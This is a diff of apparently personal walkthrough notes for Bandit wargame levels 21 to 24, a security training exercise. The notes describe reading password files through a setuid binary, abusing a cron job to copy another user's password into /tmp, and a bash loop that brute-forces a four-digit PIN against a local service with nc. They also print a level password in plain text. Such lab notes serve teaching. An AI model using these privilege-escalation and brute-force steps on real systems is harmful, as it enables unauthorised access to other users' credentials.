@@ -81,3 +81,27 @@
 **Level 20**
 	+ familirization with setuid binary
  	+ ran /bandit20-do cat /etc/bandit_pass/bandit20 to get pass
+**Level 21**
+	+ had to run setuid binay to figure what it did
+ + echo old password into a nc listener and put it in the background
+**Level22**
++ check cronjobs.. see script. Cat script profit$$
+**Level 23**
++ find script read it... run part of the script use that for your target
+** Level 24 **
+  + we must first make a temp dir
+  + mktmp -d
+  + cd there and make script
+  + set permissions to max so you can you run script
+  + make empty password file to have cronjob append
+  + cp script from tmp to target dir
+  + script : cat /etc/bandit_pass/bandit24 > /tmp/tmp.QeNPZVkecn/password
+  + #!/bin/bash
+for i in {0000..9999}
+do 
+	echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" >> response.txt
+
+done
+
+
+cat response.txt | nc localhost 30002 > results.txt
